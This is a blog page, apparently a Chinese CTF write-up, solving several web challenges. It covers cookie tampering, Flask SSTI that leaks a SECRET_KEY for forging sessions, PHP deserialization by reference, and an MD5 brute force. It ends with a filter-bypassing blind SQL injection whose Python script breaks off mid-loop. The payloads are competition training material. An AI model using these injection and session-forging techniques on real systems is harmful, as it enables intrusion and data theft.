@@ -1,0 +1,739 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>cbctf - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="cbctf">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-07-29 23:20" pubdate>
+        2020年7月29日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      38
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">cbctf</h1>
+            
+            <div class="markdown-body">
+              <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="尖尖的商店-amp-尖尖的商店2-0"><a href="#尖尖的商店-amp-尖尖的商店2-0" class="headerlink" title="尖尖的商店&amp;尖尖的商店2.0"></a>尖尖的商店&amp;尖尖的商店2.0</h2><p>签到题，题目是购买flag，但是只有1000块买不了</p>
+<p><img src="https://s1.ax1x.com/2020/07/29/amHcgH.png" srcset="/img/loading.gif" alt="amHcgH.png"></p>
+<p>抓包看一下什么决定余额</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /buy/<span class="hljs-number">3</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Host</span>: checkin.race<span class="hljs-number">2020</span>.<span class="hljs-number">0</span>rays.club
+<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">79</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">79</span>.<span class="hljs-number">0</span>
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
+<span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span>
+<span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Referer</span>: http://checkin.race<span class="hljs-number">2020</span>.<span class="hljs-number">0</span>rays.club/
+<span class="hljs-attribute">Cookie</span>: money=<span class="hljs-number">1000</span>
+<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></code></pre>
+
+<p>可以看到是Cookie中money决定了钱，改一下就可以买到了flag了</p>
+<p>商店2.0抓包Cookie为</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">Cookie</span>: session=eyJtb<span class="hljs-number">25</span>leSI<span class="hljs-number">6</span>IjEwMDAifQ.Xx-Vcw.hnW<span class="hljs-number">8</span>Q<span class="hljs-number">0</span>BGOJR_<span class="hljs-number">6</span>D<span class="hljs-number">7</span>U<span class="hljs-number">16</span>M<span class="hljs-number">0</span>tdt<span class="hljs-number">0</span>cKs</code></pre>
+
+<p>为flask_session，base64解一下前面的一段有{“money”:”1000”} 但是没有SECRET_KEY伪造不了</p>
+<p>根据hint，在404页面Referer头处会有ssti，读取config</p>
+<pre><code class="hljs"><span class="hljs-attribute">Referer</span>: http://checkin2.race2020.0rays.club/&#123;&#123;config&#125;&#125;
+
+
+&lt;Config &#123;&#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(0, 43200), &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;JSON_AS_ASCII&#x27;: True, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;USE_X_SENDFILE&#x27;: False, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;DEBUG&#x27;: False, &#x27;SESSION_COOKIE_DOMAIN&#x27;: False, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;TESTING&#x27;: False, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;SECRET_KEY&#x27;: &#x27;vlmalkdguv923rufkjdsa7823312e&#x27;, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(31), &#x27;SERVER_NAME&#x27;: None, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False&#125;&gt;</code></pre>
+
+<p>‘SECRET_KEY’: ‘vlmalkdguv923rufkjdsa7823312e’,拿到后就能构造cookie</p>
+<pre><code class="hljs stylus">λ python flask_session_cookie_manager3<span class="hljs-selector-class">.py</span> encode -s <span class="hljs-string">&#x27;vlmalkdguv923rufkjdsa7823312e&#x27;</span> -t <span class="hljs-string">&quot;&#123;&#x27;money&#x27;: &#x27;10000000&#x27;&#125;&quot;</span>
+eyJtb25leSI6IjEwMDAwMDAwIn0<span class="hljs-selector-class">.XyGgcQ</span>.<span class="hljs-number">9</span>iKyPfloHG4qvyyDhitKGnSJOHY</code></pre>
+
+<p>用这个cookie发过去就能直接买了，脚本直接去github上搜就有了</p>
+<h2 id="Easy-Baby-Signin"><a href="#Easy-Baby-Signin" class="headerlink" title="Easy-Baby-Signin"></a>Easy-Baby-Signin</h2><p>第一步是ctfhub前置技能树一样的题，<a target="_blank" rel="noopener" href="https://writeup.ctfhub.com/Skill/Web/%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/c24bba25.html">基础认证</a></p>
+<p>爆破出密码为12345678登录后，观察url</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">121.41.13.20:10002</span>/index.php?jpg=TmpZMlF<span class="hljs-number">6</span>WXhOamN<span class="hljs-number">5</span>UlRaQk<span class="hljs-number">56</span>QTJOdz<span class="hljs-number">09</span></code></pre>
+
+<p>jpg解出来是<code>flag.jpg</code>,解密为base64-&gt;base64-&gt;hex,加密index.php带入进去就能看到源码</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment"> do you know magicword.txt?</span>
+<span class="hljs-comment"> */</span>
+error_reporting(E_ALL || ~E_NOTICE);
+
+
+header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);
+<span class="hljs-keyword">if</span>(! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;jpg&#x27;</span>]))
+    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#x27;</span>);
+<span class="hljs-variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;jpg&#x27;</span>])));
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;&#x27;</span>.<span class="hljs-string">&quot;Hacked_by_whiskey&quot;</span>.<span class="hljs-string">&#x27;&lt;/title&gt;&#x27;</span>;
+<span class="hljs-variable">$file</span> = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);
+	
+	<span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$file</span>,<span class="hljs-string">&#x27;test&#x27;</span>) == <span class="hljs-literal">false</span>)
+	&#123;
+		<span class="hljs-variable">$txt</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));
+		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.<span class="hljs-variable">$txt</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;
+		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find the flag file?&quot;</span>;
+	&#125;
+	<span class="hljs-keyword">else</span>
+	&#123;
+		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not here!Try again!&quot;</span>;
+	&#125;
+
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>看到magicword.txt，</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">#atest.php</span>
+<span class="hljs-comment">#GOAL: get the secret;</span>
+   
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">icanhear</span> </span>&#123;<span class="hljs-keyword">var</span> <span class="hljs-variable">$mykey</span>; <span class="hljs-keyword">var</span> <span class="hljs-variable">$myword</span>;&#125;
+
+<span class="hljs-variable">$magicword</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;magicword&#x27;</span>]);
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;just tell me the magicword\n&quot;</span>;
+
+<span class="hljs-variable">$magicword</span>-&gt;myword = <span class="hljs-string">&quot;***********&quot;</span>;
+
+<span class="hljs-keyword">if</span> (<span class="hljs-variable">$magicword</span>-&gt;myword === <span class="hljs-variable">$magicword</span>-&gt;mykey)
+         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sooooo close: &quot;</span>.<span class="hljs-variable">$magicword</span>-&gt;myword;
+     <span class="hljs-keyword">else</span>
+         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Damn  it !&quot;</span>;
+         
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>反序列化利用php中的引用(&amp;不同的名字访问同一个变量内容),payload</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">icanhear</span> </span>&#123;<span class="hljs-keyword">var</span> <span class="hljs-variable">$mykey</span>; <span class="hljs-keyword">var</span> <span class="hljs-variable">$myword</span>;&#125;
+
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> icanhear();
+<span class="hljs-variable">$a</span>-&gt;mykey=&amp;<span class="hljs-variable">$a</span>-&gt;myword;
+<span class="hljs-keyword">echo</span>  serialize(<span class="hljs-variable">$a</span>);</code></pre>
+
+<p>访问<code>/atest.php?magicword=O:8:&quot;icanhear&quot;:2:&#123;s:5:&quot;mykey&quot;;N;s:6:&quot;myword&quot;;R:2;&#125;</code>得到<code>hEre_flAg.php</code>,终极套娃</p>
+<pre><code class="hljs routeros">flag1 = <span class="hljs-string">&#x27;flag&#123;wa0_&#x27;</span>;
+		int(<span class="hljs-string">&#x27;flag2&#x27;</span>);
+	<span class="hljs-keyword">if</span> md5(<span class="hljs-string">&#x27;flag2&#x27;</span>)[:6]==<span class="hljs-string">&#x27;1024cc&#x27;</span>;
+		<span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;yes,yes&#x27;</span>);
+	flag3 = <span class="hljs-string">&#x27;_is_right&#125;&#x27;</span>;
+	<span class="hljs-attribute">flag</span>=flag1+flag2+flag3;
+	just here!
+flag2 is the first number!</code></pre>
+
+<p>python脚本爆破一下</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">import</span> hashlib
+
+<span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">1000000000</span>):
+    <span class="hljs-attribute">s</span> = hashlib.md<span class="hljs-number">5</span>(str(i).encode(&#x27;UTF-<span class="hljs-number">8</span>&#x27;)).hexdigest()[:<span class="hljs-number">6</span>]
+    <span class="hljs-comment"># print(s)</span>
+    <span class="hljs-attribute">if</span> s == <span class="hljs-string">&quot;1024cc&quot;</span>:
+      <span class="hljs-attribute">print</span>(i)
+<span class="hljs-comment"># 7900588</span></code></pre>
+
+<p>flag{wa0_7900588_is_right}</p>
+<h2 id="朴实无华sqllab"><a href="#朴实无华sqllab" class="headerlink" title="朴实无华sqllab"></a>朴实无华sqllab</h2><p>给到了源码</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">//including the Mysql connect parameters.</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;On&quot;</span>); 
+error_reporting(E_ALL | E_STRICT);
+<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./sql-connections/db-creds.inc&quot;</span>);
+    <span class="hljs-variable">$con1</span> = mysqli_connect(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);
+    <span class="hljs-variable">$con2</span> =mysqli_select_db(<span class="hljs-variable">$con1</span>,<span class="hljs-variable">$dbname1</span>);
+<span class="hljs-comment">// take the variables </span>
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))
+&#123;
+
+	<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
+	<span class="hljs-comment">//fiddling with comments</span>
+	<span class="hljs-variable">$res</span>= blacklist(<span class="hljs-variable">$id</span>);
+	<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>) <span class="hljs-keyword">die</span>();
+	<span class="hljs-comment">//echo &quot;&lt;br&gt;&quot;;</span>
+	<span class="hljs-comment">//echo &quot;&lt;br&gt;&quot;;</span>
+<span class="hljs-comment">// connectivity </span>
+
+<span class="hljs-comment">//    echo &quot;success!\n&quot;;</span>
+    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; &quot;</span>;
+
+	<span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$con1</span>,<span class="hljs-variable">$sql</span>);
+	<span class="hljs-variable">$row</span> = mysqli_fetch_array(<span class="hljs-variable">$result</span>);
+	<span class="hljs-keyword">if</span>(<span class="hljs-number">0</span>)
+	&#123;
+	    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
+	  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;	
+	  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user&#x27;</span>];
+	  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
+	  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your pass:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];
+	  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;
+  	&#125;
+
+&#125;
+
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+	<span class="hljs-variable">$res</span> = preg_match(<span class="hljs-string">&#x27;/\\&amp;|or|,|and| |\||\/\*\*\/|sleep|benchmark|%|flag/i&#x27;</span>,<span class="hljs-variable">$id</span>);
+	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>)&#123;
+		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+	&#125;
+	<span class="hljs-keyword">else</span>&#123;
+		<span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;
+	&#125;
+
+&#125;</code></pre>
+
+<p>可以看到过滤了非常多的东西，并且因为if(0)完全没有回显，考虑盲注。首先验证延时，sleep函数都禁用了，</p>
+<p>参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5505%E4%BB%A5%E5%8F%8Ahint%EF%BC%8C%E9%87%87%E7%94%A8%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E7%9B%B2%E6%B3%A8%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%9E%84%E9%80%A0">https://xz.aliyun.com/t/5505以及hint，采用笛卡尔积盲注，接下来一步一步构造</a></p>
+<pre><code class="hljs sqf">语句
+ $sql=<span class="hljs-string">&quot;SELECT * FROM user WHERE id=&#x27;$id&#x27; &quot;</span>;
+
+这里空格，<span class="hljs-built_in">and</span> <span class="hljs-keyword">if</span> 逗号 <span class="hljs-built_in">sleep</span> 全禁了，得绕
+
+空格 -&gt; <span class="hljs-comment">/*2*/</span> ,因为<span class="hljs-comment">/**/</span>也被禁用
+<span class="hljs-built_in">and</span> -&gt; id=<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-number">1</span> 等于号替换，与id=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>意思相同
+<span class="hljs-keyword">if</span>  -&gt; <span class="hljs-keyword">case</span>语句代替
+<span class="hljs-built_in">sleep</span> -&gt;  <span class="hljs-built_in">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> user a inner <span class="hljs-built_in">join</span> user b....做笛卡尔积 / mysql种 cross <span class="hljs-built_in">join</span> ,inner <span class="hljs-built_in">join</span>和 <span class="hljs-built_in">join</span>实现功能一样，所以这里可以代替使用
+
+笛卡尔积这里选用数据行数多的表，可能是由于题的原因，我用了两个表 user和mysql.help_relation才延时成功，单用mysql.help_relation或者user表都没成，很奇怪
+
+(<span class="hljs-built_in">SELECT</span><span class="hljs-comment">/*2*/</span><span class="hljs-built_in">count</span>(*)<span class="hljs-comment">/*2*/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/*2*/</span>user<span class="hljs-comment">/*2*/</span>A<span class="hljs-comment">/*2*/</span><span class="hljs-built_in">join</span><span class="hljs-comment">/*2*/</span>mysql.help_relation<span class="hljs-comment">/*2*/</span>o<span class="hljs-comment">/*2*/</span><span class="hljs-built_in">join</span><span class="hljs-comment">/*2*/</span>mysql.help_relation<span class="hljs-comment">/*2*/</span>p)
+
+<span class="hljs-string">&#x27;=(case when 1&gt;2 then 1 else sleep(2)end)%23</span>
+<span class="hljs-string">把sleep(2)换掉上面这个就成了</span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string">1&#x27;</span>=(<span class="hljs-keyword">case</span><span class="hljs-comment">/*2*/</span>when<span class="hljs-comment">/*2*/</span><span class="hljs-number">1</span>&gt;<span class="hljs-number">2</span><span class="hljs-comment">/*2*/</span><span class="hljs-keyword">then</span><span class="hljs-comment">/*2*/</span><span class="hljs-number">1</span><span class="hljs-comment">/*2*/</span><span class="hljs-keyword">else</span><span class="hljs-comment">/*2*/</span>(<span class="hljs-built_in">SELECT</span><span class="hljs-comment">/*2*/</span><span class="hljs-built_in">count</span>(*)<span class="hljs-comment">/*2*/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/*2*/</span>user<span class="hljs-comment">/*2*/</span>A<span class="hljs-comment">/*2*/</span><span class="hljs-built_in">join</span><span class="hljs-comment">/*2*/</span>mysql.help_relation<span class="hljs-comment">/*2*/</span>o<span class="hljs-comment">/*2*/</span><span class="hljs-built_in">join</span><span class="hljs-comment">/*2*/</span>mysql.help_relation<span class="hljs-comment">/*2*/</span>p)end)%<span class="hljs-number">23</span>
+</code></pre>
+
+<p>1&gt;2判断的地方换成payload就可以盲注了，这里我用的查询方法这种比较注出来的。</p>
+<pre><code class="hljs n1ql">(<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>) &gt; <span class="hljs-keyword">BINARY</span> <span class="hljs-string">&quot;1~&quot;</span></code></pre>
+
+<p>例如数据库种查询的东西为flag，”flag”&gt;”g<del>“为真，”flag”&gt;”f</del>“假，进入延时。加个BINARY区分大小写</p>
+<p>查询数据库的话可以用mysql.innodb_table_stats表，但是sql库里面只有user一个表，flag大概率也在这个表，但是不知道列名，用无列名注入</p>
+<pre><code class="hljs awk">(select<span class="hljs-regexp">/*2*/g</span>roup_concat(`<span class="hljs-number">4</span>`)<span class="hljs-regexp">/*2*/</span>from<span class="hljs-regexp">/*2*/</span>(select*from((select<span class="hljs-regexp">/*2*/</span><span class="hljs-number">1</span>)b<span class="hljs-regexp">/*2*/</span>join<span class="hljs-regexp">/*2*/</span>(select<span class="hljs-regexp">/*2*/</span><span class="hljs-number">2</span>)ab<span class="hljs-regexp">/*2*/</span>join<span class="hljs-regexp">/*2*/</span>(select<span class="hljs-regexp">/*2*/</span><span class="hljs-number">3</span>)ac<span class="hljs-regexp">/*2*/</span>join<span class="hljs-regexp">/*2*/</span>(select<span class="hljs-regexp">/*2*/</span><span class="hljs-number">4</span>)ad)<span class="hljs-regexp">/*2*/u</span>nion<span class="hljs-regexp">/*2*/</span>select<span class="hljs-regexp">/*2*/</span>*<span class="hljs-regexp">/*2*/</span>from<span class="hljs-regexp">/*2*/u</span>ser)aa)</code></pre>
+
+<p>附上脚本</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])
+
+url = <span class="hljs-string">&quot;http://47.56.137.217:10002/?id=1&#x27;=&quot;</span>
+
+<span class="hljs-comment"># print(requests.post(url,data=payload).text)</span>
+x=<span class="hljs-string">&quot;4,flag&#123;0ur_daTaBase_1&quot;</span> <span class="hljs-comment"># user ? flag&#123;0ur_daTaBase_1S_c001&#125;</span>
+
+<span class="hljs-keyword">for</span> Len <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
+    ppay=<span class="hljs-string">&quot;+,-./0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ`abcdefghijklmnopqrstuvwxyz&#123;|&#125;&quot;</span>
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):
+
